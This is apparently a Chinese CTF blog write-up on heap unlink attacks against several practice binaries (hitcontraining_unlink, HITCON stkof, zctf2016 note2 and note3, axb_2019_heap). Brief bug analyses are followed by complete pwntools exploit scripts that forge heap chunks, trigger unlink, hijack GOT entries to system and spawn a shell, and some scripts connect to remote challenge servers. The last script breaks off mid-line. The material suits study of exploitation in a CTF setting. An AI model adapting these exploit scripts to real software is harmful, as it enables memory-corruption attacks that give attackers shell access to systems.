<p>最终这道题的思路就是伪造一个fake_chunk，然后free掉一个堆块，触发unlink与fake_chunk合并，让fake_chunk的地址改为&amp;p-0x18，此时往fake_chunk中写入数据，就相当于往bss段上写入数据，进行篡改bss段存放的chunk信息（写入atoi函数的got表覆盖第1个chunk的地址），然后执行show函数泄露atoi的真实地址，再执行change函数，修改atoi函数的got表为system地址，最后输入&#x2F;bin&#x2F;sh获取shell。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p>直接用下面这个脚本是打不通的，我自己写了个tools模块，使用了里面自己定义的函数，如果想使用下面脚本的话可以在<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里</a>获取tools的源码，然后创建一个名为tools的py文件，或者删去我自定义的函数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27507</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400C27,0x400CDD)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbbbbb&#x27;</span>)<span class="comment">#为什么要申请一个0x80大小的chunk?因为如果小于了0x80的chunk，free掉后会进入fastbin，而fastbin中是不会进行合并操作的。申请0x80再加上0x10的头部free掉后就可以到unsortedbin</span></span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span> <span class="comment">#这个地址为写入数据的chunk的地址</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi_addr&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;atoi&#x27;,atoi_addr,libc)</span></span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(sys_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220625221316198-16141362.png"></p>
<h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><p>这道题跟hitcontraining_unlink题目都是一样的手法，利用unlink达到修改函数got表的目的。唯一的区别就是这道题没有%s寻址泄露，也就是无法将got表写到chunk地址（bss段记录chunk信息的位置）执行打印函数进行泄露。所以需要先劫持free函数的got表为puts函数的plt表，然后再将chunk地址改为puts的got地址，free掉改为puts的got地址那个堆块，即可进行泄露。</p>
<p>下面简单分析一下这道题，首先这道题是没有菜单的，根据里面的功能自己找一下就行了。</p>
<p><img src="/../img/2706180-20220625221844974-83069417.png"></p>
<p>这道题有个点是以前不知道的。一般的题目都会使用setbuf关闭缓冲区，但是这道题没有使用setbuf关闭缓冲区，然后使用printf和fgets的时候发现他们也各自申请了一个堆块。为了探究原因si进去单步调试了一下，发现是调用了_IO_file_doallocate函数，然后这个函数调用了malloc。_IO_file_doallocate的作用是分配输入缓冲区。因此原因为printf先将数据输出到缓冲区中，由于最开始没有缓冲区，因此需要使用malloc进行申请。将数据先存放到这个刚申请的缓冲区里，等碰见fflush函数再进行输出。</p>
<h4 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h4><p>整体思路，利用溢出构造fake_chunk，然后释放引线堆块(就是fake_chunk下面（高地址）的那个chunk)，此时已经可以去修改bss段上存储的chunk信息，由于不能直接寻址泄露函数的真实地址。因此需要去用puts来进行寻址泄露。先将free的got地址改为puts的plt地址，因为传给puts的参数是一个指针，然后puts就会进行寻址泄露，因此只要bss地址存放的chunk地址改成puts的got表，然后free掉这个位置的chunk(此时已经是puts的got表了，而且free被劫持成了puts),就可以泄露出来函数的真实地址了。然后同样的手法修改free的got表为system的地址就行，最后free掉装有&#x2F;bin&#x2F;sh的chunk即可获取shell。<br>tools这个函数库的源码在这 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">here</a></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26316)</span></span><br><span class="line">debug(p,<span class="number">0x400B7A</span>,<span class="number">0x400A87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2 unlink</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3 lead chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5 prevent merge</span></span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(<span class="number">0</span>)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(puts_plt_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220625221902497-1011860752.png"></p>
<h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/2706180-20220625221916782-1505040812.png"></p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="/../img/2706180-20220625221927065-1302076520.png"></p>
<p>漏洞点在这里,在比较的时候，拿了无符号数和有符号数做比较，程序会自动将其转化为无符号数来判断，也就是a2我们输入成0，那就是-1&gt;i，把-1转化成无符号数0xffffffff。因此输入的内容就成了0xffffffff字节的数据。毫无疑问这里存在了溢出。</p>
<p>不过由于输入的是0，因此malloc申请chunk的时候，自然就申请了0x20字节的chunk（0x10的chunk头，0x10的最小用户空间）</p>
<p>为什么要先提这里，难道edit函数不存在溢出漏洞么？下面分析一下。</p>
<p><img src="/../img/2706180-20220625222007500-1812777143.png"></p>
<p>这里就要了个索引，然后就可以往里面输入数据了，最多能输入144字节的数据。似乎只要申请一个小点的chunk，用edit也能溢出，然后unlink。</p>
<p>但是有一个地方要注意到，edit函数确实可以溢出，但是会被00截断，因为下面strlen函数。</p>
<p><img src="/../img/2706180-20220625222019802-1809134741.png"></p>
<p>这里似乎看的是将输入的数据中%去除掉，但是在遍历的时候，用了strlen来判断字符串的结尾，因此输入数据如果出现了p64打包的字节流，就会将strlen截断，从而拷贝数据失败。</p>
<p>因此想通过溢出来进行unlink，还要通过add函数的溢出。</p>
<h4 id="大致思路-1"><a href="#大致思路-1" class="headerlink" title="大致思路"></a>大致思路</h4><p>先申请三个chunk，第一个大小无所谓，让它来存放fake_chunk，然后第二个chunk的大小要为0，因为要溢出它，但是由于用户空间只有0x10，所以只能将fake_chunk布置到低地址的那个chunk（就是第一个chunk），然后利用溢出，修改第三个chunk的prev_size和size，充当引线堆块。引线堆块的大小没的说，要大于0x80,因为不能让它free掉的时候进入到fastbin里面。</p>
<p>剩下的就是常规unlink的操作了，将引线堆块释放掉，然后fake_chunk的地址被放到了bss段上。edit编辑bss段上存放的chunk信息，然后进行泄露函数真实地址和篡改got表的操作，最终获取shell。</p>
<p>以这道题为例，指的一提的是unlink要通过检查 就要伪造&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10 而bss段放的是chunk的用户地址（这个用户地址也就是正常情况下fake_chunk所处的地址)，所以chunk 1的地址下面的内容最开始就要是伪造的&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10，而不能将fake_chunk放到其他位置。</p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27755)</span></span><br><span class="line"><span class="comment">#debug(p,0x400F4F)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;TheNewContents:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>,fake_chunk)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;ddddd&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)<span class="comment">#前面是垃圾数据（非0）后面只有这一个地址，因此地址中的00被截断了，也不影响数据本身</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h3><h4 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220625222036558-1667669742.png"></p>
<h4 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h4><p><img src="/../img/2706180-20220625222045970-1527119726.png"></p>
<p>漏洞和note2一样，依旧拿着int类型和unsigned int类型作比较，导致-1可以变成一个很大的整数，从而导致输入产生了溢出。</p>
<p>然后这道题的show函数，无法使用，就导致了泄露不是那么舒服。</p>
<h4 id="大致思路-2"><a href="#大致思路-2" class="headerlink" title="大致思路"></a>大致思路</h4><p>然后常规unlink的手段，跟note2的手法一样，就不再赘述。</p>
<p>unlink之后，要泄露函数的真实地址。先将free函数的got表改为puts的plt地址，然后再把bss段存放的chunk地址改成puts的got地址，执行free进行泄露。需要注意的是输入的数据最后会被加上00，这道题free的got表和puts的got表是挨着的，如果把p64打包的数据给free后，最后加上的00会覆盖puts的真实的最低字节。导致puts无法正常使用，程序会崩溃。</p>
<p>因此发送p64打包的地址时，需要用切片处理一下，发送7个字节即可，加上\n八字节，然后程序会将\n换成00，因此不会干扰到puts的真实地址。</p>
<p><a href="(https://www.cnblogs.com/ZIKH26/articles/16307343.html)">tools源码</a></p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400BB9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 1024)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the new content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020C8</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,fake_chunk)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;1&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#lead_chunk</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#par_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">payload=p64(puts_plt_addr)[:<span class="number">7</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr)[:<span class="number">7</span>])</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220625222103836-1038592504.png"></p>
<h3 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h3><h4 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/image-20221007182429275.png" alt="image-20221007182429275"></p>
<h4 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h4><p><img src="/../img/image-20221007182443910.png" alt="image-20221007182443910"></p>
<p>banner函数里面存在一个格式化字符串漏洞，根据以往的经验，通常堆+格式化字符串漏洞的题目中，格式化字符串漏洞都起到一个泄露地址的作用。因为存在这个漏洞，所以我们就相当于有了libc基地址，程序基地址。</p>
<p><img src="/../img/image-20221007182456742.png" alt="image-20221007182456742"></p>
<p>get_input函数中存在一个off_by_one漏洞。由于我们有程序基地址，所以就能拿到bss段上存储chunk信息的地址，就可以打unlink(这道题我最开始考虑的是off by one+double free+fastbin attack，不过在构造的时候想起来了，这道题释放的堆块进入不到fastbin中)</p>
<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<p>整体来说就是一个格式化字符串泄露地址+unlink 比较简单，这里我就直接放exp了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28336</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x11A8</span></span><br><span class="line">d_d=<span class="number">0x11ba</span></span><br><span class="line">d_e=<span class="number">0x11e0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter a size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Done!\n&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_d)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter your name: &#x27;</span>,<span class="string">b&#x27;%15$p%14$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x20830</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span 